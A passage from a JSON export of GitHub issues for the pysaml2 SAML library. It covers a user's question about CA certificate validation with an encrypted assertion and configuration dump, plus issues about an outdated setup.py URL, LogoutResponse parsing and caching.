ZXN0dW5pY2FsLml0MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvS7mP0WWs2bOljgx 8o5SsLKD/xHPuz60fNDyrklDA8i8ZcajO0Ig00mozzwcG1R22qkGIsSw0W66cNx3Pr8H6qaBeWoE Vz4nSP+rc0hsA6m+282bNr4qVgV0GuEMZBXHLNqozmrQMLViD7A9h8jmYg/Htuf4tOufq1OhyOKA wYGlCGWDJ0qWrIg6yEiiHT1nNJXDR76j+LHo1RpKBCNTnAJBJoJfjgTIMg5xqZVeq1fl3yp9m9iE 6kMn1nHah7+r6zh80rPO+MMAJ1K7GKAvgyhToeGte1h0AJ0ePte3WpAbrZ2YFPpUfJ0SAGE0zjEg pGeZNIJFG7GKq4noT9HFJwIDAQABo1AwTjAdBgNVHQ4EFgQUJJIh+ueR3vym14fFs74kWDPQExYw HwYDVR0jBBgwFoAUJJIh+ueR3vym14fFs74kWDPQExYwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0B AQsFAAOCAQEAl3+WxM0/zs82k+c9X8bstmcd6zX+immJ4AIM+A4wS+DWDIaDMxRbpHWyqDh5PoBW E/oq1DSrMGRaZsQvY0Aqosljy9BwA34lTtZT72hr8nJhqA24Pb8Gf4ciVfW7JKUnFz1kd5Mx+Juc tutao5+19hB2SUdSqXrLYSoz0MVLY74RebmrQFEPflxqDxPE9465H2c+JWeDbReU0KU3j/YnWWi2 ZZhWLxT3GIayMWIGXQnsO0pW6pIX9bI8x3eumNozHF8/Rpk76ejfO2XbjAh2Zk9uN9GniTqxejsL 1fOdgW7uoKnlzSJF2IH2Wq29zf59k5tUSzLhBzftuZSU1HVcDg==</ds:X509Certificate> </ds:X509Data> </ds:KeyInfo> <xenc:CipherData xmlns:xenc=\"http://www.w3.org/2001/04/xmlenc#\"> <xenc:CipherValue>vB7EacVk0VtoT6b9Z0hTtXGW0eBmQykvKffjExM/6jN/LAx1D3PdK/N3kYDYPwLk3IdTrhX8q6hK pDG+PeCNjZnEfOHst/9VhKsvch16E6wyuymu3QWPKzVMeZw+Dt4pnDeT1Hw4rFJW7bigLtUgMP23 3SldXEoijCnh4g4+p1P2sLccC1kHpsubSZv7ugin+RSHWWVH3DZyLnM/4qDOIql86kcZRMOmtR3s 94uP5XVfDos13ZUdXbAwYFt+eJfUhAUJRHJdBYxTTvKdQZG9MwLMPlq32j8aeQ2eMsgB0TbhXwzT Qdl342nbemrMcCEwXmUmEsI6PyIZbFP9wHew9w==</xenc:CipherValue> </xenc:CipherData> </xenc:EncryptedKey> </ds:KeyInfo> <xenc:CipherData xmlns:xenc=\"http://www.w3.org/2001/04/xmlenc#\"> <xenc:CipherValue>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 V0L+Djjj+Rc/pw+YEoXCsyIA6Q==</xenc:CipherValue> </xenc:CipherData> </xenc:EncryptedData> </saml2:EncryptedAssertion> </saml2p:Response>\r\n````\r\n\r\n## Possible Solution\r\nI'm lookin for a solution to the 2nd issue.\r\nI'm asking if there are some arguments/options/parameter to study and understand about how to include the CA.crt to config[idp] or whatever to solve this problem. Is this something I can do IDP side (appending CA.crt and IDP.crt in a single file)? This IDP actually works well with a ShibV2 SP. I'm sure that I'm missing something around.\r\n\r\nProbably I have to study this function more in the deep:\r\nsaml2.sigver.security_context(conf, debug=None)\r\n\r\nit returns:\r\n````\r\nreturn SecurityContext(\r\n        crypto, conf.key_file, cert_file=conf.cert_file, metadata=metadata,\r\n        debug=debug, only_use_keys_in_metadata=_only_md,\r\n        cert_handler_extra_class=conf.cert_handler_extra_class,\r\n        generate_cert_info=conf.generate_cert_info,\r\n        tmp_cert_file=conf.tmp_cert_file,\r\n        tmp_key_file=conf.tmp_key_file,\r\n        validate_certificate=conf.validate_certificate,\r\n        enc_key_files=enc_key_files,\r\n        encryption_keypairs=conf.encryption_keypairs,\r\n        sec_backend=sec_backend)\r\n````\r\n\r\n## Steps to Reproduce\r\nactual configuration is:\r\n\r\n````\r\n{'_homedir': '.',\r\n '_sp_allow_unsolicited': False,\r\n '_sp_attribute_converters': [<saml2.attribute_converter.AttributeConverter object at 0x7fe26e0bf0b8>,\r\n                              <saml2.attribute_converter.AttributeConverter object at 0x7fe26e0bf1d0>,\r\n                              <saml2.attribute_converter.AttributeConverter object at 0x7fe26e0bf240>,\r\n                              <saml2.attribute_converter.AttributeConverter object at 0x7fe26e0bfc50>,\r\n                              <saml2.attribute_converter.AttributeConverter object at 0x7fe26e07d198>],\r\n '_sp_authn_requests_signed': False,\r\n '_sp_endpoints': {'assertion_consumer_service': [('http://sp.pysaml2.testunical.it/saml2/acs/',\r\n                                                   'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST')],\r\n                   'single_logout_service': [('http://sp.pysaml2.testunical.it/saml2/ls/',\r\n                                              'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect'),\r\n                                             ('http://sp.pysaml2.testunical.it/saml2/ls/post',\r\n                                              'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST')]},\r\n '_sp_force_authn': True,\r\n '_sp_idp': {'https://idp.testunical.it/idp/shibboleth': {'single_logout_service': {'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect': 'https://idp.testunical.it/idp/logout'},\r\n                                                          'single_sign_on_service': {'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect': 'https://idp.testunical.it/idp/login/process/'}}},\r\n '_sp_logout_requests_signed': True,\r\n '_sp_name': 'http://sp.pysaml2.testunical.it/saml2/metadata/',\r\n '_sp_name_id_format': ['urn:oasis:names:tc:SAML:2.0:nameid-format:transient'],\r\n '_sp_name_id_format_allow_create': True,\r\n '_sp_optional_attributes': ['eduPersonAffiliation'],\r\n '_sp_required_attributes': ['uid',\r\n                             'mail',\r\n                             'sn',\r\n                             'cn',\r\n                             'schacPersonalUniqueID'],\r\n '_sp_want_response_signed': True,\r\n 'accepted_time_diff': None,\r\n 'additional_cert_files': None,\r\n 'allow_unknown_attributes': False,\r\n 'attribute': [],\r\n 'attribute_converters': [<saml2.attribute_converter.AttributeConverter object at 0x7fe26e0bf128>,\r\n                          <saml2.attribute_converter.AttributeConverter object at 0x7fe26dfe0198>,\r\n                          <saml2.attribute_converter.AttributeConverter object at 0x7fe26dfe0588>],\r\n 'attribute_profile': [],\r\n 'ca_certs': '/home/user/DEV3/Django-Identity/djangosaml2_sp/djangosaml2_sp/certificates/shibidp/testunical.it-cacert.pem',\r\n 'cert_file': '/home/wert/DEV3/Django-Identity/djangosaml2_sp/djangosaml2_sp/certificates/shibidp/sp-cert.pem',\r\n 'cert_handler_extra_class': None,\r\n 'contact_person': [{'company': 'Universita della Calabria',\r\n                     'contact_type': 'technical',\r\n                     'email_address': 'giuseppe.demarco@unical.it',\r\n                     'given_name': 'Giuseppe',\r\n                     'sur_name': 'De Marco'},\r\n                    {'company': 'Universita della Calabria',\r\n                     'contact_type': 'technical',\r\n                     'email_address': 'giuseppe.demarco@unical.it',\r\n                     'given_name': 'Giuseppe',\r\n                     'sur_name': 'De Marco'}],\r\n 'context': 'sp',\r\n 'crypto_backend': 'xmlsec1',\r\n 'debug': False,\r\n 'description': None,\r\n 'disable_ssl_certificate_validation': True,\r\n 'domain': '',\r\n 'encryption_keypairs': [{'cert_file': '/home/user/DEV3/Django-Identity/djangosaml2_sp/djangosaml2_sp/certificates/shibidp/sp-cert.pem',\r\n                          'key_file': '/home/user/DEV3/Django-Identity/djangosaml2_sp/djangosaml2_sp/certificates/shibidp/sp-key.pem'}],\r\n 'entity_category': '',\r\n 'entityid': 'http://sp.pysaml2.testunical.it/saml2/metadata/',\r\n 'extension_schema': {},\r\n 'extensions': {},\r\n 'generate_cert_func': None,\r\n 'generate_cert_info': None,\r\n 'key_file': '/home/user/DEV3/Django-Identity/djangosaml2_sp/djangosaml2_sp/certificates/shibidp/sp-key.pem',\r\n 'logger': None,\r\n 'logout_requests_signed': None,\r\n 'metadata': <saml2.mdstore.MetadataStore object at 0x7fe26e0bf048>,\r\n 'metadata_key_usage': 'both',\r\n 'name': None,\r\n 'name_form': None,\r\n 'name_id_format': None,\r\n 'name_id_format_allow_create': None,\r\n 'name_qualifier': '',\r\n 'only_use_keys_in_metadata': True,\r\n 'organization': {'display_name': [('Unical', 'it'), ('Unical', 'en')],\r\n                  'name': [('Unical', 'it'), ('Unical', 'en')],\r\n                  'url': [('http://www.unical.it', 'it'),\r\n                          ('http://www.unical.it', 'en')]},\r\n 'policy': None,\r\n 'preferred_binding': {'artifact_resolution_service': ['urn:oasis:names:tc:SAML:2.0:bindings:SOAP'],\r\n                       'assertion_consumer_service': ['urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST',\r\n                                                      'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect',\r\n                                                      'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Artifact'],\r\n                       'assertion_id_request_service': ['urn:oasis:names:tc:SAML:2.0:bindings:URI'],\r\n                       'attribute_consuming_service': ['urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect',\r\n                                                       'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST',\r\n                                                       'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Artifact'],\r\n                       'attribute_service': ['urn:oasis:names:tc:SAML:2.0:bindings:SOAP'],\r\n                       'authn_query_service': ['urn:oasis:names:tc:SAML:2.0:bindings:SOAP'],\r\n                       'authz_service': ['urn:oasis:names:tc:SAML:2.0:bindings:SOAP'],\r\n                       'manage_name_id_service': ['urn:oasis:names:tc:SAML:2.0:bindings:SOAP',\r\n                                                  'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect',\r\n                                                  'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST',\r\n                                                  'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Artifact'],\r\n                       'name_id_mapping_service': ['urn:oasis:names:tc:SAML:2.0:bindings:SOAP'],\r\n                       'single_logout_service': ['urn:oasis:names:tc:SAML:2.0:bindings:SOAP',\r\n                                                 'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect',\r\n                                                 'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST',\r\n                                                 'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Artifact'],\r\n                       'single_sign_on_service': ['urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect',\r\n                                                  'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST',\r\n                                                  'urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Artifact']},\r\n 'requested_attribute_name_format': 'urn:oasis:names:tc:SAML:2.0:attrname-format:uri',\r\n 'scope': '',\r\n 'secret': None,\r\n 'serves': ['sp'],\r\n 'tmp_cert_file': None,\r\n 'tmp_key_file': None,\r\n 'valid_for': 8760,\r\n 'validate_certificate': None,\r\n 'verify_encrypt_cert_advice': None,\r\n 'verify_encrypt_cert_assertion': None,\r\n 'verify_ssl_cert': False,\r\n 'virtual_organization': None,\r\n 'vorg': {},\r\n 'xmlsec_binary': '/usr/bin/xmlsec1',\r\n 'xmlsec_path': []}\r\n````\r\n\r\n### Expected solution\r\n\r\nI would like to test pysaml2 in tests environment with encryption capabilities using self signed certificates. It could be possibile that I'm using a wrong approach and there's a common way to avoid this issue. I'm asking this here before continuining debug!\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/506", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/506/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/506/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/506/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/506", "id": 322108389, "node_id": "MDU6SXNzdWUzMjIxMDgzODk=", "number": 506, "title": "setup.py uses old url, github identity should be IdentityPython instead of rohe", "user": {"login": "jdennis", "id": 300306, "node_id": "MDQ6VXNlcjMwMDMwNg==", "avatar_url": "https://avatars1.githubusercontent.com/u/300306?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jdennis", "html_url": "https://github.com/jdennis", "followers_url": "https://api.github.com/users/jdennis/followers", "following_url": "https://api.github.com/users/jdennis/following{/other_user}", "gists_url": "https://api.github.com/users/jdennis/gists{/gist_id}", "starred_url": "https://api.github.com/users/jdennis/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jdennis/subscriptions", "organizations_url": "https://api.github.com/users/jdennis/orgs", "repos_url": "https://api.github.com/users/jdennis/repos", "events_url": "https://api.github.com/users/jdennis/events{/privacy}", "received_events_url": "https://api.github.com/users/jdennis/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2018-05-10T22:31:27Z", "updated_at": "2018-05-22T13:36:00Z", "closed_at": "2018-05-22T13:36:00Z", "author_association": "NONE", "active_lock_reason": null, "body": "The github location seems to have been updated from rohe to IdentityPython.\r\n\r\nbut setup.py still references the old URL, e.g.:\r\n\r\n    url='https://github.com/rohe/pysaml2',\r\n\r\nI believe it should be\r\n\r\n    url='https://github.com/IdentityPython/pysaml2',\r\n\r\nI'd submit a pull request but it hardly seems worth it to fix one word.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/504", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/504/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/504/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/504/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/504", "id": 321630600, "node_id": "MDU6SXNzdWUzMjE2MzA2MDA=", "number": 504, "title": "Error while attempting to parse LogoutResponse from IDP", "user": {"login": "ksshetty", "id": 1976785, "node_id": "MDQ6VXNlcjE5NzY3ODU=", "avatar_url": "https://avatars0.githubusercontent.com/u/1976785?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ksshetty", "html_url": "https://github.com/ksshetty", "followers_url": "https://api.github.com/users/ksshetty/followers", "following_url": "https://api.github.com/users/ksshetty/following{/other_user}", "gists_url": "https://api.github.com/users/ksshetty/gists{/gist_id}", "starred_url": "https://api.github.com/users/ksshetty/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ksshetty/subscriptions", "organizations_url": "https://api.github.com/users/ksshetty/orgs", "repos_url": "https://api.github.com/users/ksshetty/repos", "events_url": "https://api.github.com/users/ksshetty/events{/privacy}", "received_events_url": "https://api.github.com/users/ksshetty/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2018-05-09T16:01:04Z", "updated_at": "2018-08-03T00:02:26Z", "closed_at": "2018-08-03T00:02:26Z", "author_association": "NONE", "active_lock_reason": null, "body": "While using Okta as my Identity Provider and attempting to initiate a global logout from the SP side, I found the following error message upon receiving the LogoutResponse message from the IDP even after configuring the `single_logout_service` endpoints in the config. \r\n\r\n```\r\n2018-05-09T00:04:20 develop    ERROR  [9249f1987b7246fabfcaa797f113db8e] saml2.response response.py:404 - https://mysp.com/saml/logout/ not in []\r\n```\r\nUpon debugging this issue, I found that the `kwargs[\"return_addrs\"]` was empty and was not being populated correctly.\r\n\r\nI have managed to fix this by modifying the code in [entity.py](https://github.com/IdentityPython/pysaml2/blob/master/src/saml2/entity.py#L1181) to pass the kwargs as an argument (similar to what is being done [here](https://github.com/IdentityPython/pysaml2/blob/master/src/saml2/client_base.py#L700))\r\n\r\nWill be submitting a PR on this shortly.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/503", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/503/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/503/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/503/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/503", "id": 319993790, "node_id": "MDU6SXNzdWUzMTk5OTM3OTA=", "number": 503, "title": "Questions regarding the cache", "user": {"login": "ksshetty", "id": 1976785, "node_id": "MDQ6VXNlcjE5NzY3ODU=", "avatar_url": "https://avatars0.githubusercontent.com/u/1976785?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ksshetty", "html_url": "https://github.com/ksshetty", "followers_url": "https://api.github.com/users/ksshetty/followers", "following_url": "https://api.github.com/users/ksshetty/following{/other_user}", "gists_url": "https://api.github.com/users/ksshetty/gists{/gist_id}", "starred_url": "https://api.github.com/users/ksshetty/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ksshetty/subscriptions", "organizations_url": "https://api.github.com/users/ksshetty/orgs", "repos_url": "https://api.github.com/users/ksshetty/repos", "events_url": "https://api.github.com/users/ksshetty/events{/privacy}", "received_events_url": "https://api.github.com/users/ksshetty/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 5605570, "node_id": "MDU6TGFiZWw1NjA1NTcw", "url": "https://api.github.com/repos/IdentityPython/pysaml2/labels/question", "name": "question", "color": "cc317c", "default": true, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2018-05-03T16:32:16Z", "updated_at": "2018-05-23T23:18:22Z", "closed_at": "2018-05-22T13:37:27Z", "author_association": "NONE", "active_lock_reason": null, "body": "I have two questions regarding the usage of the cache in this library:\r\n\r\n1. Will the cache in [population.py](https://github.com/IdentityPython/pysaml2/blob/fd7a4f694b137a92f2a8b7f502d51fc21e3528c7/src/saml2/population.py#L11) work in a multi process environment? I am using an environment where there could be multiple Django containers. During debugging, I find that the cache is empty even if I'm explicitly invoking `add_information_about_person(session_info)` which internally sets the cache. Note that the `set` and `get` are occurring across two separate REST API calls.\r\n\r\n2. I notice that there are couple of other cache implementations [mcache](https://github.com/IdentityPython/pysaml2/blob/fd7a4f694b137a92f2a8b7f502d51fc21e3528c7/src/saml2/mcache.py) and [mdbcache](https://github.com/IdentityPython/pysaml2/blob/fd7a4f694b137a92f2a8b7f502d51fc21e3528c7/src/saml2/mdbcache.py). Is there documentation describing how I can configure/use them?\r\n\r\nThanks in advance.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/500", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/500/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/500/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/500/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/500", "id": 304886286, "node_id": "MDU6SXNzdWUzMDQ4ODYyODY=", "number": 500, "title": "Question regarding SP metadata and authn_requests_signed attribute", "user": {"login": "ksshetty", "id": 1976785, "node_id": "MDQ6VXNlcjE5NzY3ODU=", "avatar_url": "https://avatars0.githubusercontent.com/u/1976785?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ksshetty", "html_url": "https://github.com/ksshetty", "followers_url": "https://api.github.com/users/ksshetty/followers", "following_url": "https://api.github.com/users/ksshetty/following{/other_user}", "gists_url": "https://api.github.com/users/ksshetty/gists{/gist_id}", "starred_url": "https://api.github.com/users/ksshetty/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ksshetty/subscriptions", "organizations_url": "https://api.github.com/users/ksshetty/orgs", "repos_url": "https://api.github.com/users/ksshetty/repos", "events_url": "https://api.github.com/users/ksshetty/events{/privacy}", 